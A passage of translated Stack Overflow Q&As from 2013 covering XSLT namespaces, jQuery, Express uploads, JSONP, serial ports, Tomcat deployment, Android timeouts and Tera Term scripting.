                </xsl:when>
            </xsl:choose>
        </soap:Envelope>
    </xsl:template>

</xsl:stylesheet> 
```

导入的 XSL：

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

    <xsl:template name="string-replace">
        <xsl:param name="text" />
        <xsl:param name="pattern" />
        <xsl:param name="replace-with" />
        <xsl:choose>
            <xsl:when test="contains($text, $pattern)">
                <xsl:value-of select="substring-before($text, $pattern)" />
                <xsl:value-of select="$replace-with" />
                <xsl:call-template name="string-replace">
                    <xsl:with-param name="text"
                        select="substring-after($text, $pattern)" />
                    <xsl:with-param name="pattern" select="$pattern" />
                    <xsl:with-param name="replace-with" select="$replace-with" />
                </xsl:call-template>
            </xsl:when>
            <xsl:otherwise>
                <xsl:value-of select="$text" />
            </xsl:otherwise>
        </xsl:choose>
    </xsl:template>

    <!-- Datos de Control -->
    <xsl:template name="STDR2_DATOS_CONTROL">
        <xsl:param name="ns" />
        <xsl:variable name="datControl" select="STDR2_DATOS_CONTROL" />
        <xsl:element name="wsb:codigoOperacion" namespace="{$ns}">
            <xsl:value-of select="$datControl/STDR2_CODOPE" />
        </xsl:element>
        <xsl:element name="wsb:numeroOperacion" namespace="{$ns}">
            <xsl:value-of select="$datControl/STDR2_NUMOPEBCO" />
        </xsl:element>
    </xsl:template>

    <!-- Datos de Empresa -->
    <xsl:template name="STDR2_DATOS_EMPRESA">
        <xsl:param name="ns" />
        <xsl:variable name="datEmpresa" select="STDR2_DATOS_EMPRESA" />
        <xsl:element name="wsb:codigoBanco" namespace="{$ns}">
            <xsl:value-of select="$datEmpresa/STDR2_CODBCO" />
        </xsl:element>
        <xsl:element name="wsb:codigoConvenio" namespace="{$ns}">
            <xsl:value-of select="$datEmpresa/STDR2_CODCONTR" />
        </xsl:element>
    </xsl:template>

    <!-- Datos de Operacion -->
    <xsl:template name="STDR2_DATOS_OPERACION">
        <xsl:param name="ns" />
        <xsl:variable name="datOperacion" select="STDR2_DATOS_OPERACION" />
        <xsl:element name="wsb:canalOperacion" namespace="{$ns}">
            <xsl:value-of select="$datOperacion/STDR2_CANAL" />
        </xsl:element>
        <xsl:element name="wsb:codigoOficina" namespace="{$ns}">
            <xsl:value-of select="$datOperacion/STDR2_CODOFI" />
        </xsl:element>
        <xsl:element name="wsb:fechaOperacion" namespace="{$ns}">
            <xsl:value-of select="$datOperacion/STDR2_FECOPE" />
        </xsl:element>
        <xsl:element name="wsb:horaOperacion" namespace="{$ns}">
            <xsl:value-of select="$datOperacion/STDR2_HOROPE" />
        </xsl:element>
    </xsl:template>

</xsl:stylesheet> 
```

我得到这个 XML 结果（输出转换）：

```
<?xml version="1.0" encoding="UTF-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header/>
  <soap:Body/>
  <wsb:ConsultarSC xmlns:wsb="'http://tempuri.org/'">
    <wsb:codigoOperacion xmlns:wsb="http://tempuri.org/">1010</wsb:codigoOperacion>
    <wsb:numeroOperacion xmlns:wsb="http://tempuri.org/">36</wsb:numeroOperacion>
    <wsb:codigoBanco xmlns:wsb="http://tempuri.org/">11</wsb:codigoBanco>
    <wsb:codigoConvenio xmlns:wsb="http://tempuri.org/">404</wsb:codigoConvenio>
    <wsb:numeroReferenciaDeuda>20205221868</wsb:numeroReferenciaDeuda>
    <wsb:codigoOficina xmlns:wsb="http://tempuri.org/">CN</wsb:codigoOficina>
    <wsb:codigoOficina xmlns:wsb="http://tempuri.org/">1</wsb:codigoOficina>
    <wsb:fechaOperacion xmlns:wsb="http://tempuri.org/">20130327</wsb:fechaOperacion>
    <wsb:horaOperacion xmlns:wsb="http://tempuri.org/">123020</wsb:horaOperacion>
    <wsb:datosEmpresa/>
  </wsb:ConsultarSC>
</soap:Envelope> 
```

如何“避免”“重复”命名空间声明（在所有子元素中）：

```
xmlns:wsb="http://tempuri.org/" 
```

我只想要一个这样的声明（在父级中）：

```
<?xml version="1.0" encoding="UTF-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Header/>
      <soap:Body/>
      <wsb:ConsultarSC xmlns:wsb="http://tempuri.org/">
        <wsb:codigoOperacion>1010</wsb:codigoOperacion>
        <wsb:numeroOperacion>36</wsb:numeroOperacion>
        <wsb:codigoBanco>11</wsb:codigoBanco>
        <wsb:codigoConvenio>404</wsb:codigoConvenio>
        <wsb:numeroReferenciaDeuda>20205221868</wsb:numeroReferenciaDeuda>
        <wsb:canalOperacion>CN</wsb:canalOperacion>
        <wsb:codigoOficina>1</wsb:codigoOficina>
        <wsb:fechaOperacion>20130327</wsb:fechaOperacion>
        <wsb:horaOperacion>123020</wsb:horaOperacion>
        <wsb:datosEmpresa/>
      </wsb:ConsultarSC>
    </soap:Envelope> 
```

提前致谢，

问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:38:38.217

命名空间被添加到所有子节点，因为您用于`wsb:ConsultarSC`元素的命名空间是`'http://tempuri.org/'`而不是`http://tempuri.org/`. 换句话说，当前父节点和子节点正在以*不同的*命名空间输出。

而不是这一行：

```
<wsb:ConsultarSC xmlns:wsb="'http://tempuri.org/'"> 
```

用这个：

```
<wsb:ConsultarSC xmlns:wsb="http://tempuri.org/"> 
```

它应该按照您想要的方式运行。

# button - ePub 3.0 电子书中的 Spotify 播放按钮

> ID：15772392
> 
> 赞同：0
> 
> 时间：2013-04-02T19:12:28.440
> 
> 标签：button, spotify, playback, epub

我正在使用 InDesign CS6、Sigil、Textwrangler 和 ePub Zip-Unzip 制作 ePub 3.0 电子书。我想要“类似”的 Spotify 播放按钮，但适用于 ePub 3.0 电子书，而不是网站。我希望在 ePub 3.0 电子书中对这个 Spotify 播放按钮进行编码，允许通过互联网流式传输或以前在 iPad 上下载到 Spotify.app 的曲目来播放 Spotify 音轨。从我所读到的关于 ePub 3.0 的内容（Sandy Kleinfeld 的 HTML5 for Publishers 和 Garrish & Gylling 的 EPUB 3 Best Practices）看来，对于 ePub 3.0 似乎没有好处。

有人对此有任何建议或信息吗？谢谢，查理

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T22:55:57.530

您将无法访问 Spotify.app 中的任何数据，所以这是一条死胡同。

如果您可以通过简单的网络请求进行流式传输所需的用户验证，则可以在 ePub 中进行，但我对此表示怀疑。

# jquery - 如何将 jQuery hide() 然后 fadeIn() 压缩为一行？

> ID：15772393
> 
> 赞同：2
> 
> 时间：2013-04-02T19:12:30.433
> 
> 标签：jquery

我正在使用 jQuery 向表中添加新行，并根据需要使行淡入，但只能通过两次调用，第一个用于`after`在表末尾添加新行，然后我使用`hide`后跟`fadeIn`获取影响。我想压缩这个

```
$(document).ready(function ($) {
    $("button").click(function () {
        $.get('@Url.Action("AddCalculatorRow", "Workshop", 
                           new { id = Model.Id } )', function (data) {
            $('.calculator').find("tbody tr:last").after(data);
            $('.calculator').find("tbody tr:last").hide().fadeIn(2000);
        });
    });
}); 
```

重复告诉我必须有一种更优雅的方式来实现外观。但是，如果我这样做

```
$('.calculator').find("tbody tr:last").after(data).hide().fadeIn(2000); 
```

然后立即显示添加的行，最后一行隐藏并淡入......这看起来很糟糕。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:16:31.667

添加新内容后只需定位下一个元素。

```
$('.calculator').find("tbody tr:last").after(data).next().hide().fadeIn(2000); 
```

或交换它：

```
$(data).hide().appendTo('.calculator tbody').fadeIn(2000); 
```

在使用数据之前继续解析数据也很聪明，但这完全是可选的：

```
$($.parseHTML(data)).hide().appendTo('.calculator tbody').fadeIn(2000); 
```

# image - 如何使用 node.js 和 express 上传、显示和保存图片

> ID：15772394
> 
> 赞同：140
> 
> 时间：2013-04-02T19:12:31.417
> 
> 标签：image, node.js, upload, express

我需要上传一张图片，并显示它，并保存它，这样我在刷新本地主机时就不会丢失它。这需要使用“上传”按钮来完成，该按钮会提示选择文件。

我正在使用 node.js 并表示服务器端代码。

* * *

## 回答 #1

> 赞同：309
> 
> 时间：2013-04-02T20:00:07.317

首先，您应该制作一个包含[文件输入元素](http://www.w3.org/TR/html-markup/input.file.html)的 HTML 表单。您还需要[将表单的**enctype**属性设置为**multipart/form-data**](https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4.2)：

```
<form method="post" enctype="multipart/form-data" action="/upload">
    <input type="file" name="file">
    <input type="submit" value="Submit">
</form> 
```

**假设表单在index.html**中定义，存储在相对于脚本所在位置的名为**public的目录中，您可以通过以下方式提供它：**

```
const http = require("http");
const path = require("path");
const fs = require("fs");

const express = require("express");

const app = express();
const httpServer = http.createServer(app);

const PORT = process.env.PORT || 3000;

httpServer.listen(PORT, () => {
  console.log(`Server is listening on port ${PORT}`);
});

// put the HTML file containing your form in a directory named "public" (relative to where this script is located)
app.get("/", express.static(path.join(__dirname, "./public"))); 
```

完成后，用户将能够通过该表单将文件上传到您的服务器。但是要在您的应用程序中重新组装上传的文件，您需要解析请求正文（作为多部分表单数据）。

在**Express 3.x**中，您可以使用`express.bodyParser`中间件来处理多部分表单，但从**Express 4.x**开始，没有与框架捆绑的正文解析器。幸运的是，您可以从[许多可用的**multipart/form-data**解析器中进行选择](https://www.npmjs.com/search?q=keywords%3Aexpress%20multipart%2Fform-data)。在这里，我将使用[multer](https://github.com/expressjs/multer)：

您需要定义一个路由来处理表单帖子：

```
const multer = require("multer");

const handleError = (err, res) => {
  res
    .status(500)
    .contentType("text/plain")
    .end("Oops! Something went wrong!");
};

const upload = multer({
  dest: "/path/to/temporary/directory/to/store/uploaded/files"
  // you might also want to set some limits: https://github.com/expressjs/multer#limits
});

app.post(
  "/upload",
  upload.single("file" /* name attribute of <file> element in your form */),
  (req, res) => {
    const tempPath = req.file.path;
    const targetPath = path.join(__dirname, "./uploads/image.png");

    if (path.extname(req.file.originalname).toLowerCase() === ".png") {
      fs.rename(tempPath, targetPath, err => {
        if (err) return handleError(err, res);

        res
          .status(200)
          .contentType("text/plain")
          .end("File uploaded!");
      });
    } else {
      fs.unlink(tempPath, err => {
        if (err) return handleError(err, res);

        res
          .status(403)
          .contentType("text/plain")
          .end("Only .png files are allowed!");
      });
    }
  }
); 
```

在上面的示例中，发布到**/upload的****.png**文件将保存到相对于脚本所在位置的**上传目录。**

 ****为了显示上传的图片，假设您已经有一个包含**img**元素的 HTML 页面：

```
<img src="/image.png" /> 
```

您可以在您的快递应用程序中定义另一条路线并用于`res.sendFile`提供存储的图像：

```
app.get("/image.png", (req, res) => {
  res.sendFile(path.join(__dirname, "./uploads/image.png"));
}); 
```****

# python - Visual Studio 的 python 工具中的 rdflib

> ID：15772397
> 
> 赞同：0
> 
> 时间：2013-04-02T19:12:31.590
> 
> 标签：python, visual-studio-2010, rdflib, ptvs

我想在 Visual Studio 的 python 工具中使用 rdflib。我安装了 python 工具和 rdflib。当我`import rdflib`在我的项目中写入（在文件*** .py 中）并启动它时，它返回一个错误

> 基数为 10 的 int() 的无效文字：'value'

并指向行`import rdflib` 虽然我可以在 Python Interactive 中打开 Tools->Python Tools->Execute Project ，并在`import rdflib`那里执行而没有错误。但是当我关闭该窗口时，我仍然无法使用该库在*** .py 文件中进行编码。

如何使用 Visual Studio 中的 rdflib，如何避免该错误？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-22T01:24:53.187

我发现如果您使用 Ctrl+F5（而不是 F5）启动程序，它将起作用。也许 python 工具或 rdflib 在 Visual Studio 中调试时存在一些问题。

# php - 使用 AJAX 从 PHP 文件中获取 JSON 适用于 localhost，但不适用于外部服务器 (000webhost)？

> ID：15772400
> 
> 赞同：0
> 
> 时间：2013-04-02T19:12:36.683
> 
> 标签：php, mysql, ajax, json

全新使用 AJAX 和 JSON 与 PHP 和 MYSQL。我的代码与 localhost 一起使用，但没有从 000webhost 上的 PHP 文件返回任何内容。只是想知道是否有任何必要的代码我在这里遗漏了外部服务器，或者我是否因为 000webhost 本身而必须添加额外的代码（尽管我不认为是这种情况）。这是我的一个 PHP 文件的代码：

```
<?php

include 'dbconfig.php';

$con = mysql_connect($dbhost,$dbuser,$dbpass);
$dbs = mysql_select_db($dbname, $con);

$result = mysql_query("SELECT * FROM `desserts`");

$data = array();
while ( $row = mysql_fetch_row($result) )
{
  $data[] = $row;
}
echo json_encode( $data );
?> 
```

（这只是一个测试文件，所以我不担心 sql 注入或任何类似的东西）

这是检索数据的 JavaScript 代码：

```
$.ajax({                                      
                          url: 'http://appname.net/PHP/getDesserts.php',
                          data: "data",            

                          dataType: 'json',             
                          success: function(rows) 
                          {
                              for(var i in rows)
                              {
                                    var row = rows[i];

                                    var startname = row[1];
                                    var startprice = row[2];
                                    var startpagelink = row[4];

                                    $('#main_content').append('<b><a href="'+startpagelink+'">'+'<img id="sammich" src="sammich.jpg">'+'</br>'+startname+'</br><font color="400000">£'+startprice)
                                    .append("</font><hr /></a></b>"); 
                            }
                          } 
                        }); 
```

正如我所说，这段代码适用于 localhost，但是当我将 php 文件移动到服务器并更改 url 以适应时，我开始遇到这个问题。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:30:39.593

使用[JSONP](http://en.wikipedia.org/wiki/JSONP)，这是一种从不同域中的服务器请求数据的方法。

像这样更新您的后端脚本。（您可能还应该添加一些内容来验证这`$_GET['callback']`是一个有效的 javascript 函数名称）。

```
echo $_GET['callback'].'('.json_encode($data).');'; 
```

和这样的客户端脚本。

```
$.ajax({                                      
   url: 'http://appname.net/PHP/getDesserts.php',
   dataType: 'jsonp', 
```

# java - Java：比较字符数组是否区分大小写？

> ID：15772401
> 
> 赞同：1
> 
> 时间：2013-04-02T19:12:39.807
> 
> 标签：java

我正在编写一个程序来比较几个字符与一个字符数组并返回数组的索引。有没有办法比较忽略大小写？例如下面：

```
String in = "I AM A HAPPY BOY";
char[] cha = new char[] {a,c,e,g,i,k,h,m,o,q,s,u,w,y};
char testChar = in.substring(4,5).charAt(0);

for(int a = 0; a<char.length; a++){
   if(cha[a] == testChar)
       return a+1;
} 
```

我无法获得索引，因为它总是指向 0。这里有没有忽略大小写？欣赏一些建议。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-02T19:16:07.100

对两个字符使用 Character.toLowerCase：

```
if (Character.toLowerCase(cha[a]) == Character.toLowerCase(testChar)) {
    // logic here
} 
```

作为旁注，如果数组中的所有字符都已经是小写，则可以使用第一个 toLowerCase ，或者甚至在初始字符串上使用*toLowerCase**并*避免两者。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-02T19:16:52.320

您可以使用[`Character.toLowerCase(char)`](http://docs.oracle.com/javase/6/docs/api/java/lang/Character.html#toLowerCase%28char%29)：

```
if (Character.toLowerCase(cha[a]) == Character.toLowerCase(testChar)) {
   return a+1;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-02T19:17:03.030

`Character.ToLowerCase(char c)`在测试相等性之前使用。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-04-02T19:17:27.857

in=in.toLowerCase();

然而，在大小写之间转换字符的最有效方法是翻转第 6 位（ASCII 值相差 32）。

# c - 关闭串口连接时程序挂起

> ID：15772404
> 
> 赞同：5
> 
> 时间：2013-04-02T19:12:43.977
> 
> 标签：c, linux, serial-port

我正在使用 PL2303 驱动程序通过 USB 连接作为串行端口读取数据。`open`当我设置 TTY 选项和非阻塞时，它会成功返回。当我尝试关闭连接时，它挂起。在这种状态下，它读取“�”而不是字符。

我可以用cutecom完美地连接到设备。这是奇怪的部分：

1.  如果我首先通过cutecom（串行监视器）连接到设备，我的程序每次都可以完美地连接和关闭。它读取字符，因为我希望它们被读取。（没有�）。
2.  如果我断开并重新连接硬件，我的程序将再次挂起，直到我运行 cutecom。

由于它在我使用cutecom 后有效，这让我觉得我在初始连接或连接设置中遗漏了一些东西。这是我用来连接的：

```
baud_rate = 38400;
fd =  open (device_path, O_RDONLY | O_NOCTTY ); 
```

在我的`set_tty_options`功能中：

```
struct termios tty_options;

memset (&tty_options, 0, sizeof(tty_options));
tcgetattr (fd, &tty_options);

cfsetispeed(&tty_options, baud_rate);                         // set baud rate
tty_options.c_cflag = (tty_options.c_cflag & ~CSIZE) | CS8;   // 8 bit msgs
tty_options.c_cflag |= (CLOCAL | CREAD);                      // enable reading

tty_options.c_cflag &= ~(PARENB | PARODD);                    // shut off parity
tty_options.c_cflag |= parity;
tty_options.c_cflag &= ~CSTOPB;
tty_options.c_cflag &= ~CRTSCTS;

if (tcsetattr (fd, TCSANOW, &tty_options) != 0) 
{
  printf("error %d from tcsetattr\n", errno);
  return TTY_ERROR;
} 
```

在`set_blocking`功能上：

```
if (tcgetattr (fd, &tty) != 0)
{
  printf("error %d from tggetattr", errno);
  return FAILURE;
}

// 0 or 1 byte is enough to return from read
tty.c_cc[VMIN]  = should_block ? 1 : 0; 
tty.c_cc[VTIME] = 5;            // 0.5 seconds read timeout

if (tcsetattr (fd, TCSANOW, &tty) != 0) 
{
  printf("error %d setting term attributes", errno);
  return FAILURE;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-03T06:19:02.383

我认为您想添加`| O_SYNC`到打开标志以坚持同步 i/o。我怀疑这会导致问题。

但是，我认为您想忽略中断信号，该信号被报告为 NUL 字符，就像您得到的那样：

```
tty_settings.c_iflag &= ~IGNBRK;         // ignore break signal 
```

此外，您要确保输入处理完全关闭，以便接收退格、^C、^\ 等不会触发任何反应：

```
tty_settings.c_lflag = 0;                // no signaling chars, no echo,
                                         // no canonical processing 
```

看起来您已经在使用[我的 set_blocking() 函数](https://stackoverflow.com/a/6947758/198536)，所以应该没问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-03T19:21:28.623

这就是我最终做的事情。我基本上是通过从[cutecom的](http://sourceforge.net/projects/cutecom/develop)源代码中复制和粘贴部分来解决这个问题的。

1.  打开时...

    ```
    int fd, n;
    fd = open (device_path, O_RDONLY | O_NOCTTY | O_NDELAY);

    ... error check fd ...

    n = fcntl(ail_info->ail_serial_fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, n & ~O_NDELAY); 
    ```

2.  你不能像我一样设置波特率。您必须使用定义的`B38400`;

    `baud = B38400;`

3.  然后，我添加了 wallyk 的答案。

    `tty_settings.c_lflag = 0;`

**编辑：**根据锯末评论，我找到了一种将其设置为原始输入的更好方法。

```
tty_options.c_lflag &= ~(ICANON | ECHO | ECHOE | ISIG); 
```

它有效。

# javascript - 如何停止 iMacros JavaScript 脚本？

> ID：15772406
> 
> 赞同：2
> 
> 时间：2013-04-02T19:12:47.533
> 
> 标签：javascript, imacros

每次我在 iMacros 脚本中使用循环时，当我按下停止按钮时，脚本不会停止。它只是跳到另一个循环计数器并继续。

因此，如果我在两个循环中有一个宏，如下所示：

```
while(counter < 10)
{    
    for(var i=0; i<10; i++)
    {
        iimPlay(macro)
    }    
} 
```

我必须按 Stop 几次，直到没有弹出一些错误或计数器没有停止。那么如何避免这种情况以及当我在脚本停止后按下停止按钮时？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:38:25.943

添加这个：

```
main:{
while(counter<10)
{
for(var i=0;i<10;i++)
{
var ret=iimPlay(macro);
if (ret == -101){break main;} // abort script if user presses Stop button
}
}
} 
```

# ftp - 为什么使用 cutftp 8.0 下载速度急剧下降

> ID：15772407
> 
> 赞同：0
> 
> 时间：2013-04-02T19:12:51.510
> 
> 标签：ftp, sftp

在Cute Ftp的帮助下下载大量文件（7000到10000）时，每个文件一个文件的下载时间很长，当我开始我的服务文件时，我的服务文件每秒下载1kb文件..慢慢地每分钟只有 2 或 3 个三个文件

在上传文件时我没有遇到任何问题，我所有的文件都将是 1KB 大小的文件。

请找到我配置的我可爱的 ​​ftp 设置：

全局选项下的传输设置

--> 在转会窗口

*   传输模式为：自动检测
*   数据模式为：自动
*   **取消选中**允许传输发生现有（浏览）会话
*   **CHECKED** 在恢复传输时在 APPE 之前发送 REST 命令
*   在多部分传输中选择最大值时，默认值为 4 个线程

--> IN传输/事件窗口

***检查以下选项***

从队列中删除成功传输项目自动保留下载文件的远程时间戳

**未选中剩余选项**

--> 在常规/日志文件窗口中

***检查以下选项***

*   **每5 分钟**删除一次已保存的日志
***   存在传输引擎后删除错误日志*   完成后立即删除成功传输的项目日志**

 **取消选中

*   记录/显示时间戳

当传输引擎退出时：**删除缩略图缓存中的图像**

请询问我是否需要提供任何信息，请指导我提高下载传输的性能速度

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T14:46:33.093

这很正常，它必须将每个文件写入一个扇区和单个文件的特殊内容，这与数据部分无缝的大文件不同，

如果 ftp 服务器有一个在线面板或类似的东西（对我来说我有 godaddy），你可以将它全部压缩成一个 zip 文件，那么你可以快速下载 zip 文件。这就是我所做的**

# java - 在哪里可以找到 Vaadin 版本 6 文档

> ID：15772413
> 
> 赞同：2
> 
> 时间：2013-04-02T19:13:16.183
> 
> 标签：java, vaadin

我正在寻找 vaadin **version6**文档。在 vaadin 主页上，我只能找到 Vaadin**版本 7**的文档。

我在哪里可以找到：

*   vaadin版本6？
*   Vaadin 版本 6 的采样器？
*   版本 6 的地址簿示例？

可用时： - 采样器的源代码/战争？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:41:19.647

[此页面](https://vaadin.com/releases)包含指向[Vaadin 6 Javadoc](https://vaadin.com/releases)的链接。我在他们的书链接中将 7 更改为 6 并最终获得了[Book of Vaadin v6](https://vaadin.com/book/vaadin6/-/page/preface.html)。

[这里](http://dev.vaadin.com/svn/versions/6.2/demo/src/com/vaadin/demo/sampler/)的采样器源，看起来像 svn。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T19:28:45.370

[vaadin 版本 6 的书](https://vaadin.com/download/book-of-vaadin/vaadin-6/pdf/book-of-vaadin.pdf)。我找不到任何示例，因为该网站已针对版本 7 进行了更新。

# coldfusion - cfc 和 cfm 之间的区别

> ID：15772416
> 
> 赞同：3
> 
> 时间：2013-04-02T19:13:25.263
> 
> 标签：coldfusion, cfc, cfml

我正在尝试为在 ColdFusion 中运行的网站创建一个基本的 UDF（用户定义函数）库。在这样做时，我试图找出 cfc 和 cfm 文件之间的区别。哪个对创建这个函数库更有帮助？我知道我可以使用

```
<cfinclude template="mytemplate.cfm> 
```

将其包含在页面中，但每次都会在该页面上运行该 cfm 的全部内容。除了创建 cfc 的对象并以这种方式调用函数之外，我不知道使用 cfc 的更简单方法。

```
<cfobject type="component" action="create" name="test"> 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:28:49.523

我这样做的方式是在 cfc 中创建我所有的 UDF。然后我在应用程序启动时初始化该 cfc：

```
public function onApplicationStart() {
    // Application settings
    application.util = createObject("component","cfc.util");
    return;
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-02T19:26:37.487

使用 cfc，您可以从更多地方更轻松地调用，如果它不是太大，请将其放入您的应用程序范围

# java - 在使用 tomcat 部署期间避免临时 404 错误

> ID：15772419
> 
> 赞同：3
> 
> 时间：2013-04-02T19:13:37.843
> 
> 标签：java, tomcat7, opengrok

每次我复制`OpenGrok/dist/source.war`到时，tomcat 都会在复制后的几秒钟内向我的用户`/var/tomcat/webapps/`生成带有错误的空白错误页面。`404 Not Found`

```
HTTP/1.1 404 Not Found
Server: Apache-Coyote/1.1
Content-Length: 0
Date: Tue, 02 Apr 2013 19:00:14 GMT
Connection: close 
```

这是不可接受的。通过手动将文件复制到 tomcat 目录中，我没有正确部署`.war`，还是某种 OpenGrok 错误？`404`我如何确保在部署过程中没有一个访问者会受到不当影响？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T21:13:27.133

Tomcat 7 有一个称为并行部署的特性。使用此功能，可以让您的应用程序的多个实例在同一上下文路径下运行。

这篇博文很好地解释了它：[http ://www.javacodegeeks.com/2011/06/zero-downtime-deployment-and-rollback.html](http://www.javacodegeeks.com/2011/06/zero-downtime-deployment-and-rollback.html)

总而言之，当你将它们添加到你的 appBase 时，你需要手动对你的战争进行版本控制。

```
cp foo##001.war apache-tomcat-7/webapps/
cp foo##002.war apache-tomcat-7/webapps/ 
```

您可能希望将`undeployOldVersions`and设置`autoDeploy`为 true，以便 tomcat 自动部署应用程序并在不再需要时删除旧版本。检查[https://tomcat.apache.org/tomcat-7.0-doc/config/host.html](https://tomcat.apache.org/tomcat-7.0-doc/config/host.html)以获取有关 tomcat 配置的更多信息。

## 之后的版本必须是可比较的字符串，因此您可以使用例如来自 CI 系统的内部版本号，但您可能必须对其进行零填充。

有几点需要注意：

*   外部资源需要是可共享的，如果您使用的是数据库，但您的新版本需要一个新模式，您会遇到问题。或者，如果您在特定端口上打开 TCP 侦听器，它也是不可共享的。
*   缓存，如果您的应用程序使用内部缓存，它们应该被写入并快速过期
*   该应用程序必须不可部署

# android - Android -Json httpRequest 超时连接

> ID：15772421
> 
> 赞同：0
> 
> 时间：2013-04-02T19:13:41.577
> 
> 标签：android, json, connection, timeout, httprequest

当我执行 httpRequest 时，如何设置连接超时？我回到之前的活动？因为我的apilcacion 被防火墙阻止了，我可以腾出一些时间无法连接到服务器，我返回到之前的活动并显示一个Toast 告诉我没有互联网连接？

这是我的代码的一部分：

```
protected String doInBackground(String... args) {

        List<NameValuePair> params = new ArrayList<NameValuePair>();

        JSONObject json = jParser.makeHttpRequest(url_list, "GET",
                params);

        Log.d("All Products: ", json.toString());

        try {

            int success = json.getInt(TAG_SUCCESS);

            if (success == 1) {

                daftar_rs = json.getJSONArray(TAG_DAFTAR_RS);

                for (int i = 0; i < daftar_rs.length(); i++) {
                    JSONObject c = daftar_rs.getJSONObject(i); 
//Continue here with a process to show a listview... 
```

当没有互联网连接时，应用程序完全关闭并显示错误，有人知道我该如何解决吗？非常感谢你！老师们好！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:19:04.727

要检查您是否可以访问互联网，您可以使用类似的东西

```
public boolean connesso() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo netInfo = cm.getActiveNetworkInfo();
        if (netInfo != null && netInfo.isConnectedOrConnecting()) {
            return true;
        }
        return false;
    } 
```

对于连接超时，我使用 httpclient 来发出请求，您也可以处理套接字超时

```
HttpParams httpParameters = new BasicHttpParams();
int timeout1 = 1000*10;
int timeout2 = 1000*10;
HttpConnectionParams.setConnectionTimeout(httpParameters, timeout1);
HttpConnectionParams.setSoTimeout(httpParameters, timeout2);
HttpClient httpclient = new DefaultHttpClient(httpParameters);

String jsonString = "";
HttpGet request;
try {
    request = new HttpGet(new URI(url));

    request.addHeader("User-Agent", "Android");

    HttpResponse response = httpclient.execute(request);

    StatusLine statusLine = response.getStatusLine();
    if (statusLine.getStatusCode() == HttpStatus.SC_OK) {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        response.getEntity().writeTo(out);
        out.close();
        jsonString = out.toString();
    }

    }catch(ConnectException e){             
    // handle your exception here, maybe something like
        Toast.makeText(context,"Error!",5000).show();
        finish(); // if your are within activity class, otherwise call finish on your activity          

    } catch (URISyntaxException e1) {
    // TODO Auto-generated catch block
        e1.printStackTrace();
        } catch (ClientProtocolException e) {
    // TODO Auto-generated catch block
        e.printStackTrace();
    } catch (IOException e) {
    // TODO Auto-generated catch block
        e.printStackTrace();
    } catch (Exception e) {
        e.printStackTrace();
    }
JSONObject myJsonObject = new JSONObject(jsonString);
// etc... 
```

# scripting - Tera Term Scripting，需要帮助开发宏

> ID：15772439
> 
> 赞同：5
> 
> 时间：2013-04-02T19:15:05.403
> 
> 标签：scripting, macros

我正在通过串行端口使用 Tera Term 在板上进行一些测试。最近我发现我可以在 Tera Term 中编写一些脚本，所以我一直在研究以帮助自动化并使测试更容易一些。

我知道 Tera Term 有一个网站，其中列出了示例宏和命令列表，但我想我需要的是有 Tera Term 脚本经验的人。

Tera Term 使用一种称为 Tera Term Language (TTL) 的基本语言，但我发现从该站点很难确定我需要使用哪些命令。

Tera term 网站：[http](http://ttssh2.sourceforge.jp/) ://ttssh2.sourceforge.jp/ < --**注意：网站是日文的，但我总是自动翻译...**

我正在尝试开发一个脚本来使用“play x”命令播放一组曲目，其中 x 是曲目索引。理想情况下，曲目将播放约 3 秒，然后递增到下一个曲目。我有一个非常粗略的大纲算法，我应该描述它。

算法：

> ```
> ;start
> 
> ;input to take in number of track to test n tracks
> ;input is stored in "n"
> i=0
> 
> do while i < (n+1)
> 
> ;play track i for 3 seconds
> 
> i++
> 
> end  while
> 
> ;stop 
> ```

如果有人对 Tera 术语有任何见解或经验，我将不胜感激。

**如果现在有任何事情，我需要弄清楚如何获取输入框输入并将其存储到变量中。**剩下的我大概能猜出...

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-03T18:07:32.680

好的，我做了一些挖掘，发现了一个适度活跃的论坛： http: [//logmett.com/forum/](http://logmett.com/forum/)

在那里我找到了一个不错的线程，名为：***TeraTerm Macro Language for dummies...*** [http://logmett.com/forum/viewtopic.php?f=3&t=2133](http://logmett.com/forum/viewtopic.php?f=3&t=2133)

那个，以及实际 TeraTerm 项目站点上的命令列表是我一直在进行故障排除和解决 90% 问题的地方。

要接受用户定义的输入，请使用“输入框”命令，该命令遵循以下格式：

> **输入框“消息”“标题”[默认]**

（不完全确定默认应该做什么）

例如

> **输入框 '请输入输入' '输入'**

将出现一个对话框并提示响应。此输入被发送到默认变量**inputstr**

我已经让这个变量在某些情况下工作，但我认为问题在于该变量在技术上是一个字符串类型，所以我不能做传统的循环。我需要想出一种方法来使用 str2int 命令来做一个表达式。

